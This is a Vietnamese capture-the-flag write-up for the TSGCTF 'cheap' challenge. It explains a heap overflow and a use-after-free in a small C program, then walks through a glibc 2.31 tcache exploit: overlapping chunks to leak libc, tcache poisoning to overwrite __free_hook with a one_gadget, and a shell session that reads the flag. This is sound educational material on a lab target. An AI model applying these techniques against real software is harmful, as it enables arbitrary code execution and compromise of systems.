# Phân tích file.

```python
cheap: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=4b435b9cd30deea3e95e89b138f2f4cb02b0090b, for GNU/Linux 3.2.0, not stripped
```

```python
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

- Bài này cho mình libc của 2.31 nên có tcache.

# Reverse file.

- Bài này tác giả cho source code.
- Hàm main
    
    ```python
    int main(void) {
        init();
        int select = 0;
        while (1) {
            puts("1. create");
            puts("2. show");
            puts("3. remove");
            printf("Choice: ");
            scanf("%d", &select);
            if (select == 1) {
                create();
            } else if (select == 2) {
                show();
            } else if (select == 3) {
                delete();
            } else {
                exit(-1);
            }
    
        }
        return 0;
    }
    ```
    
- Bài có 3 chức năng chính là create, show và remove.
- Create:
    
    ```python
    void create() {
        unsigned size;
        printf("size: ");
        scanf("%u", &size);
        ptr = malloc(size);
        printf("data: ");
        readn(ptr, 0x100);
    }
    ```
    
    - Ta có thể malloc được 1 size bất kì và có thể nhập được 0x100 bytes data ⇒ overflow nếu size < 0x100.
- Show:
    
    ```python
    void show() {
        printf("%s\n", ptr);
    }
    ```
    
    - Show ptr hiện tại ra.
- Remove:
    
    ```python
    void delete() {
        free(ptr);
    }
    ```
    
    - Free nhưng không set null ⇒ UAF.
- Ở bài này như ta thấy nó remove và show không có index nên ta chỉ có thể xử lý trên 1 chunk.
- Ta có bug overflow và uaf.

# Exploit

## Leak libc.

- Mình sẽ dùng overlap chunk để gộp các chunk lại với nhau cho đủ size của unsorted bin rồi free sau đó dùng UAF để leak libc.
- Vì mình chỉ xử lý được trên 1 chunk nên mình sẽ set up như sau:
    
    ```python
    create(0x80,"b"*0x80)   <- chunk overlapping
    delete()
    create(0x90,"c"*0x80)   <- chunk to free
    delete()
    create(0x3c0,"c"*0x80)  <- chunk overlapped
    create(0x70,"a"*0x70)   <- prevent consolidate with top chunk
    ```
    
- Lúc này heap sẽ như sau:
    
    ```python
    0x0000000000000091      ................
    0x5555555592a0  0x0000000000000000      0x0000555555559010      ..........UUUU..         <-- tcachebins[0x90][0/1]
    0x5555555592b0  0x6262626262626262      0x6262626262626262      bbbbbbbbbbbbbbbb
    0x5555555592c0  0x6262626262626262      0x6262626262626262      bbbbbbbbbbbbbbbb
    0x5555555592d0  0x6262626262626262      0x6262626262626262      bbbbbbbbbbbbbbbb
    0x5555555592e0  0x6262626262626262      0x6262626262626262      bbbbbbbbbbbbbbbb
    0x5555555592f0  0x6262626262626262      0x6262626262626262      bbbbbbbbbbbbbbbb
    0x555555559300  0x6262626262626262      0x6262626262626262      bbbbbbbbbbbbbbbb
    0x555555559310  0x6262626262626262      0x6262626262626262      bbbbbbbbbbbbbbbb
    0x555555559320  0x0000000000000000      0x00000000000000a1      ................
    0x555555559330  0x0000000000000000      0x0000555555559010      ..........UUUU..         <-- tcachebins[0xa0][0/1]
    0x555555559340  0x6363636363636363      0x6363636363636363      cccccccccccccccc
    0x555555559350  0x6363636363636363      0x6363636363636363      cccccccccccccccc
    0x555555559360  0x6363636363636363      0x6363636363636363      cccccccccccccccc
    0x555555559370  0x6363636363636363      0x6363636363636363      cccccccccccccccc
    0x555555559380  0x6363636363636363      0x6363636363636363      cccccccccccccccc
    0x555555559390  0x6363636363636363      0x6363636363636363      cccccccccccccccc
    0x5555555593a0  0x6363636363636363      0x6363636363636363      cccccccccccccccc
    0x5555555593b0  0x0000000000000000      0x0000000000000000      ................
    0x5555555593c0  0x0000000000000000      0x00000000000003d1      ................
    0x5555555593d0  0x6363636363636363      0x6363636363636363      cccccccccccccccc
    0x5555555593e0  0x6363636363636363      0x6363636363636363      cccccccccccccccc
    0x5555555593f0  0x6363636363636363      0x6363636363636363      cccccccccccccccc
    0x555555559400  0x6363636363636363      0x6363636363636363      cccccccccccccccc
    0x555555559410  0x6363636363636363      0x6363636363636363      cccccccccccccccc
    0x555555559420  0x6363636363636363      0x6363636363636363      cccccccccccccccc
    0x555555559430  0x6363636363636363      0x6363636363636363      cccccccccccccccc
    0x555555559440  0x6363636363636363      0x6363636363636363      cccccccccccccccc
    0x555555559450  0x0000000000000000      0x0000000000000000      ................
    0x555555559460  0x0000000000000000      0x0000000000000000      ................
    0x555555559470  0x0000000000000000      0x0000000000000000      ................
    0x555555559480  0x0000000000000000      0x0000000000000000      ................
    0x555555559490  0x0000000000000000      0x0000000000000000      ................
    0x5555555594a0  0x0000000000000000      0x0000000000000000      ................
    0x5555555594b0  0x0000000000000000      0x0000000000000000      ................
    0x5555555594c0  0x0000000000000000      0x0000000000000000      ................
    0x5555555594d0  0x0000000000000000      0x0000000000000000      ................
    0x5555555594e0  0x0000000000000000      0x0000000000000000      ................
    0x5555555594f0  0x0000000000000000      0x0000000000000000      ................
    0x555555559500  0x0000000000000000      0x0000000000000000      ................
    0x555555559510  0x0000000000000000      0x0000000000000000      ................
    0x555555559520  0x0000000000000000      0x0000000000000000      ................
    0x555555559530  0x0000000000000000      0x0000000000000000      ................
    0x555555559540  0x0000000000000000      0x0000000000000000      ................
    0x555555559550  0x0000000000000000      0x0000000000000000      ................
    0x555555559560  0x0000000000000000      0x0000000000000000      ................
    0x555555559570  0x0000000000000000      0x0000000000000000      ................
    0x555555559580  0x0000000000000000      0x0000000000000000      ................
    0x555555559590  0x0000000000000000      0x0000000000000000      ................
    0x5555555595a0  0x0000000000000000      0x0000000000000000      ................
    0x5555555595b0  0x0000000000000000      0x0000000000000000      ................
    0x5555555595c0  0x0000000000000000      0x0000000000000000      ................
    0x5555555595d0  0x0000000000000000      0x0000000000000000      ................
    0x5555555595e0  0x0000000000000000      0x0000000000000000      ................
    0x5555555595f0  0x0000000000000000      0x0000000000000000      ................
    0x555555559600  0x0000000000000000      0x0000000000000000      ................
    0x555555559610  0x0000000000000000      0x0000000000000000      ................
    0x555555559620  0x0000000000000000      0x0000000000000000      ................
    0x555555559630  0x0000000000000000      0x0000000000000000      ................
    0x555555559640  0x0000000000000000      0x0000000000000000      ................
    0x555555559650  0x0000000000000000      0x0000000000000000      ................
    0x555555559660  0x0000000000000000      0x0000000000000000      ................
    0x555555559670  0x0000000000000000      0x0000000000000000      ................
    0x555555559680  0x0000000000000000      0x0000000000000000      ................
    0x555555559690  0x0000000000000000      0x0000000000000000      ................
    0x5555555596a0  0x0000000000000000      0x0000000000000000      ................
    0x5555555596b0  0x0000000000000000      0x0000000000000000      ................
    0x5555555596c0  0x0000000000000000      0x0000000000000000      ................
    0x5555555596d0  0x0000000000000000      0x0000000000000000      ................
    0x5555555596e0  0x0000000000000000      0x0000000000000000      ................
    0x5555555596f0  0x0000000000000000      0x0000000000000000      ................
    0x555555559700  0x0000000000000000      0x0000000000000000      ................
    0x555555559710  0x0000000000000000      0x0000000000000000      ................
    0x555555559720  0x0000000000000000      0x0000000000000000      ................
    0x555555559730  0x0000000000000000      0x0000000000000000      ................
    0x555555559740  0x0000000000000000      0x0000000000000000      ................
    0x555555559750  0x0000000000000000      0x0000000000000000      ................
    0x555555559760  0x0000000000000000      0x0000000000000000      ................
    0x555555559770  0x0000000000000000      0x0000000000000000      ................
    0x555555559780  0x0000000000000000      0x0000000000000000      ................
    0x555555559790  0x0000000000000000      0x0000000000000081      ................
    0x5555555597a0  0x6161616161616161      0x6161616161616161      aaaaaaaaaaaaaaaa
    0x5555555597b0  0x6161616161616161      0x6161616161616161      aaaaaaaaaaaaaaaa
    0x5555555597c0  0x6161616161616161      0x6161616161616161      aaaaaaaaaaaaaaaa
    0x5555555597d0  0x6161616161616161      0x6161616161616161      aaaaaaaaaaaaaaaa
    0x5555555597e0  0x6161616161616161      0x6161616161616161      aaaaaaaaaaaaaaaa
    0x5555555597f0  0x6161616161616161      0x6161616161616161      aaaaaaaaaaaaaaaa
    0x555555559800  0x6161616161616161      0x6161616161616161      aaaaaaaaaaaaaaaa
    0x555555559810  0x0000000000000000
    pwndbg> p/x 0x3d1+0xa0
    $6 = 0x471
    ```
    
    - Giờ mình sẽ malloc 0x80 thì nó sẽ dùng trong tcache để malloc sau đó mình overflow thay đổi size của chunk kế tiếp bằng 0x471 trong size của unsorted bin. Nhưng lúc này nếu ta free thì sẽ free chunk 0x80 vừa malloc trên nên mình sẽ malloc 0x90 để sử dụng chunk đã được free trước đó trong tcache và cũng là chunk được thay đổi size, lúc này free sẽ đưa vào unsorted bin.
        
        ```python
        																				0x0000000000000091      ................
        0x5555555592a0  0x6161616161616161      0x6161616161616161      aaaaaaaaaaaaaaaa
        0x5555555592b0  0x6161616161616161      0x6161616161616161      aaaaaaaaaaaaaaaa
        0x5555555592c0  0x6161616161616161      0x6161616161616161      aaaaaaaaaaaaaaaa
        0x5555555592d0  0x6161616161616161      0x6161616161616161      aaaaaaaaaaaaaaaa
        0x5555555592e0  0x6161616161616161      0x6161616161616161      aaaaaaaaaaaaaaaa
        0x5555555592f0  0x6161616161616161      0x6161616161616161      aaaaaaaaaaaaaaaa
        0x555555559300  0x6161616161616161      0x6161616161616161      aaaaaaaaaaaaaaaa
        0x555555559310  0x6161616161616161      0x6161616161616161      aaaaaaaaaaaaaaaa
        0x555555559320  0x6161616161616161      0x0000000000000471      aaaaaaaaq.......    <- overwrite size
        0x555555559330  0x6464646464646464      0x0000000000006464      dddddddddd......
        0x555555559340  0x6363636363636363      0x6363636363636363      cccccccccccccccc
        0x555555559350  0x6363636363636363      0x6363636363636363      cccccccccccccccc
        0x555555559360  0x6363636363636363      0x6363636363636363      cccccccccccccccc
        0x555555559370  0x6363636363636363      0x6363636363636363      cccccccccccccccc
        0x555555559380  0x6363636363636363      0x6363636363636363      cccccccccccccccc
        0x555555559390  0x6363636363636363      0x6363636363636363      cccccccccccccccc
        0x5555555593a0  0x6363636363636363      0x6363636363636363      cccccccccccccccc
        0x5555555593b0  0x0000000000000000      0x0000000000000000      ................
        0x5555555593c0  0x0000000000000000      0x00000000000003d1      ................    <- overlapped chunk
        0x5555555593d0  0x6363636363636363      0x6363636363636363      cccccccccccccccc
        0x5555555593e0  0x6363636363636363      0x6363636363636363      cccccccccccccccc
        0x5555555593f0  0x6363636363636363      0x6363636363636363      cccccccccccccccc
        0x555555559400  0x6363636363636363      0x6363636363636363      cccccccccccccccc
        0x555555559410  0x6363636363636363      0x6363636363636363      cccccccccccccccc
        0x555555559420  0x6363636363636363      0x6363636363636363      cccccccccccccccc
        0x555555559430  0x6363636363636363      0x6363636363636363      cccccccccccccccc
        0x555555559440  0x6363636363636363      0x6363636363636363      cccccccccccccccc
        0x555555559450  0x0000000000000000      0x0000000000000000      ................
        0x555555559460  0x0000000000000000      0x0000000000000000      ................
        0x555555559470  0x0000000000000000      0x0000000000000000      ................
        0x555555559480  0x0000000000000000      0x0000000000000000      ................
        0x555555559490  0x0000000000000000      0x0000000000000000      ................
        0x5555555594a0  0x0000000000000000      0x0000000000000000      ................
        0x5555555594b0  0x0000000000000000      0x0000000000000000      ................
        0x5555555594c0  0x0000000000000000      0x0000000000000000      ................
        0x5555555594d0  0x0000000000000000      0x0000000000000000      ................
        0x5555555594e0  0x0000000000000000      0x0000000000000000      ................
        0x5555555594f0  0x0000000000000000      0x0000000000000000      ................
        0x555555559500  0x0000000000000000      0x0000000000000000      ................
        0x555555559510  0x0000000000000000      0x0000000000000000      ................
        0x555555559520  0x0000000000000000      0x0000000000000000      ................
        0x555555559530  0x0000000000000000      0x0000000000000000      ................
        0x555555559540  0x0000000000000000      0x0000000000000000      ................
        0x555555559550  0x0000000000000000      0x0000000000000000      ................
        0x555555559560  0x0000000000000000      0x0000000000000000      ................
        0x555555559570  0x0000000000000000      0x0000000000000000      ................
        0x555555559580  0x0000000000000000      0x0000000000000000      ................
        0x555555559590  0x0000000000000000      0x0000000000000000      ................
        0x5555555595a0  0x0000000000000000      0x0000000000000000      ................
        0x5555555595b0  0x0000000000000000      0x0000000000000000      ................
        0x5555555595c0  0x0000000000000000      0x0000000000000000      ................
        0x5555555595d0  0x0000000000000000      0x0000000000000000      ................
        0x5555555595e0  0x0000000000000000      0x0000000000000000      ................
        0x5555555595f0  0x0000000000000000      0x0000000000000000      ................
        0x555555559600  0x0000000000000000      0x0000000000000000      ................
        0x555555559610  0x0000000000000000      0x0000000000000000      ................
        0x555555559620  0x0000000000000000      0x0000000000000000      ................
        0x555555559630  0x0000000000000000      0x0000000000000000      ................
        0x555555559640  0x0000000000000000      0x0000000000000000      ................
        0x555555559650  0x0000000000000000      0x0000000000000000      ................
        0x555555559660  0x0000000000000000      0x0000000000000000      ................
        0x555555559670  0x0000000000000000      0x0000000000000000      ................
        0x555555559680  0x0000000000000000      0x0000000000000000      ................
        0x555555559690  0x0000000000000000      0x0000000000000000      ................
        0x5555555596a0  0x0000000000000000      0x0000000000000000      ................
        0x5555555596b0  0x0000000000000000      0x0000000000000000      ................
        0x5555555596c0  0x0000000000000000      0x0000000000000000      ................
        0x5555555596d0  0x0000000000000000      0x0000000000000000      ................
        0x5555555596e0  0x0000000000000000      0x0000000000000000      ................
        0x5555555596f0  0x0000000000000000      0x0000000000000000      ................
        0x555555559700  0x0000000000000000      0x0000000000000000      ................
        0x555555559710  0x0000000000000000      0x0000000000000000      ................
        0x555555559720  0x0000000000000000      0x0000000000000000      ................
        0x555555559730  0x0000000000000000      0x0000000000000000      ................
        0x555555559740  0x0000000000000000      0x0000000000000000      ................
        0x555555559750  0x0000000000000000      0x0000000000000000      ................
        0x555555559760  0x0000000000000000      0x0000000000000000      ................
        0x555555559770  0x0000000000000000      0x0000000000000000      ................
        0x555555559780  0x0000000000000000      0x0000000000000000      ................
        0x555555559790  0x0000000000000000      0x0000000000000081      ................      <- prevent consolidate topchunk
        0x5555555597a0  0x6161616161616161      0x6161616161616161      aaaaaaaaaaaaaaaa
        0x5555555597b0  0x6161616161616161      0x6161616161616161      aaaaaaaaaaaaaaaa
        0x5555555597c0  0x6161616161616161      0x6161616161616161      aaaaaaaaaaaaaaaa
        0x5555555597d0  0x6161616161616161      0x6161616161616161      aaaaaaaaaaaaaaaa
        0x5555555597e0  0x6161616161616161      0x6161616161616161      aaaaaaaaaaaaaaaa
        0x5555555597f0  0x6161616161616161      0x6161616161616161      aaaaaaaaaaaaaaaa
        0x555555559800  0x6161616161616161      0x6161616161616161      aaaaaaaaaaaaaaaa
        0x555555559810  0x0000000000000000      0x00000000000207f1      ................         <-- Top chunk
        ```
        
    - Delete
        
        ```python
        unsortedbin
        all: 0x555555559320 —▸ 0x7ffff7fb1be0 (main_arena+96) ◂— 0x555555559320
        ```
        
    - Giờ chỉ cần show ta sẽ leak được libc. Sau đó ta tính base và one_gadget và __free_hook
    
    ```python
    [*] leak: 0x7ffff7fb1be0
    [*] Base: 0x7ffff7dc6000
    [*] __free_hook: 0x7ffff7fb4b28
    [*] One_gadget: 0x7ffff7eacc81
    ```
    

# Overwrite __free_hook.

- Ở bài này có 1 chunk dùng để quản lý tcaches.
    
    ```python
    0x555555559000  0x0000000000000000      0x0000000000000291      ................
    0x555555559010  0x0000000000000000      0x0000000000000000      ................
    0x555555559020  0x0000000000000000      0x0000000000000000      ................
    0x555555559030  0x0000000000000000      0x0000000000000000      ................
    0x555555559040  0x0000000000000000      0x0000000000000000      ................
    0x555555559050  0x0000000000000000      0x0000000000000000      ................
    0x555555559060  0x0000000000000000      0x0000000000000000      ................
    0x555555559070  0x0000000000000000      0x0000000000000000      ................
    0x555555559080  0x0000000000000000      0x0000000000000000      ................
    0x555555559090  0x0000000000000000      0x0000000000000000      ................
    0x5555555590a0  0x0000000000000000      0x0000000000000000      ................
    0x5555555590b0  0x0000000000000000      0x0000000000000000      ................
    0x5555555590c0  0x0000000000000000      0x0000000000000000      ................
    0x5555555590d0  0x0000000000000000      0x0000000000000000      ................
    0x5555555590e0  0x0000000000000000      0x0000000000000000      ................
    0x5555555590f0  0x0000000000000000      0x0000000000000000      ................
    0x555555559100  0x0000000000000000      0x0000000000000000      ................
    0x555555559110  0x0000000000000000      0x0000000000000000      ................
    0x555555559120  0x0000000000000000      0x0000000000000000      ................
    0x555555559130  0x0000000000000000      0x0000000000000000      ................
    0x555555559140  0x0000000000000000      0x0000000000000000      ................
    0x555555559150  0x0000000000000000      0x0000000000000000      ................
    0x555555559160  0x0000000000000000      0x0000000000000000      ................
    0x555555559170  0x0000000000000000      0x0000000000000000      ................
    0x555555559180  0x0000000000000000      0x0000000000000000      ................
    0x555555559190  0x0000000000000000      0x0000000000000000      ................
    0x5555555591a0  0x0000000000000000      0x0000000000000000      ................
    0x5555555591b0  0x0000000000000000      0x0000000000000000      ................
    0x5555555591c0  0x0000000000000000      0x0000000000000000      ................
    0x5555555591d0  0x0000000000000000      0x0000000000000000      ................
    0x5555555591e0  0x0000000000000000      0x0000000000000000      ................
    0x5555555591f0  0x0000000000000000      0x0000000000000000      ................
    0x555555559200  0x0000000000000000      0x0000000000000000      ................
    0x555555559210  0x0000000000000000      0x0000000000000000      ................
    0x555555559220  0x0000000000000000      0x0000000000000000      ................
    0x555555559230  0x0000000000000000      0x0000000000000000      ................
    0x555555559240  0x0000000000000000      0x0000000000000000      ................
    0x555555559250  0x0000000000000000      0x0000000000000000      ................
    0x555555559260  0x0000000000000000      0x0000000000000000      ................
    0x555555559270  0x0000000000000000      0x0000000000000000      ................
    0x555555559280  0x0000000000000000      0x0000000000000000      ................
    0x555555559290  0x0000000000000000
    ```
    
    - Khi 1 chunk được free thì địa chỉ và số lượng tcache sẽ được thêm vào chunk trên ví dụ mình malloc 1 chunk với size 0x80 rồi sau đó free thì nó sẽ như sau:
    
    ```python
    0x555555559000  0x0000000000000000      0x0000000000000291      ................
    0x555555559010  0x0000000000000000      0x0001000000000000      ................   <- 0x90 [  1]: 0x555555559330 ◂— 0x0
    0x555555559020  0x0000000000000000      0x0000000000000000      ................
    0x555555559030  0x0000000000000000      0x0000000000000000      ................
    0x555555559040  0x0000000000000000      0x0000000000000000      ................
    0x555555559050  0x0000000000000000      0x0000000000000000      ................
    0x555555559060  0x0000000000000000      0x0000000000000000      ................
    0x555555559070  0x0000000000000000      0x0000000000000000      ................
    0x555555559080  0x0000000000000000      0x0000000000000000      ................
    0x555555559090  0x0000000000000000      0x0000000000000000      ................
    0x5555555590a0  0x0000000000000000      0x0000000000000000      ................
    0x5555555590b0  0x0000000000000000      0x0000000000000000      ................
    0x5555555590c0  0x0000000000000000      0x0000555555559330      ........0.UUUU..
    0x5555555590d0  0x0000000000000000      0x0000000000000000      ................
    0x5555555590e0  0x0000000000000000      0x0000000000000000      ................
    
    ```
    
    - Nếu ta có thể overwrite 0x5555555590c8 thành __free_hook thì ta có thể overwrite __free_hook nếu ta gọi malloc lại 1 chunk với size 0x80.
    - Ta có thể dùng overflow để overwrite fd tcache nên ta có thể làm được điều trên.
    - Mình sẽ free 2 chunk 0x80 rồi sau đó overwrite fd của 1 chunk thành __free_hook thì lúc này bin sẽ như sau:
    
    ```python
    0x90 [  2]: 0x555555559770 —▸ 0x7ffff7fb4b28 (__free_hook) ◂— 0x0
    ```
    
    - Giờ mình chỉ cần malloc 1 chunk 0x80, rồi 1 lần nữa để overwrite __free_hook.
    
    ```python
    pwndbg> x/xg &__free_hook
    0x7ffff7fb4b28 <__free_hook>:   0x00007ffff7eacc81
    ```
    
    - Delete để get shell.
    
    ```python
        Arch:     amd64-64-little
        RELRO:    Partial RELRO
        Stack:    Canary found
        NX:       NX enabled
        PIE:      PIE enabled
    [*] Create!
    [*] Delete
    [*] Create!
    [*] Delete
    [*] Create!
    [*] Create!
    [*] Create!
    [*] Create!
    [*] Delete
    [*] Show!
    [*] leak: 0x7ff2078ebbe0
    [*] Base: 0x7ff207700000
    [*] __free_hook: 0x7ff2078eeb28
    [*] One_gadget: 0x7ff2077e6c81
    [*] Create!
    [*] Create!
    [*] Delete
    [*] Create!
    [*] Delete
    [*] Create!
    [*] Delete
    [*] Create!
    [*] Create!
    [*] Delete
    [*] Create!
    [*] Delete
    [*] Create!
    [*] Create!
    [*] Create!
    [*] Delete
    [*] Switching to interactive mode
    $ ls
    cheap
    flag
    libc.so.6
    start.sh
    $ cat flag
    TSGCTF{Heap_overflow_is_easy_and_nice_yeyey}
    $
    ```
